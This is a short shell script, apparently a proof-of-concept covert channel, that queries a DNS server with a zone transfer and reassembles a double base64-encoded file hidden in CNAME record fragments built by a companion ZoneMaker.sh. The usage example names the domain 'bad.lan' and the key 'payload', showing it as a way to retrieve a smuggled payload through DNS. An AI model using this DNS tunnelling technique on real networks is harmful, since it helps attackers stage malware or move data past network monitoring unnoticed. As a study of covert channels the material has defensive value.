#!/bin/sh
# ZoneGet.sh
# Christopher Neitzert <chris@neitzert.com>
#
# Simple script to query a DNS server and decode
# the output of DNS zone where each CNAME entry
# in the zone is a line fragment of a 
# double base64 encoded file created by the
# script ZoneMaker.sh in this directory
#
# Use ./zoneget.sh FDQN DNSserver key
# example: ./zoneget bad.lan localhost payload 
host -t axfr $1 $2|grep $3 | sort -n| cut -f2 -d"-"| cut -f1 -d"."|/bin/base64 -d |/bin/base64 -d
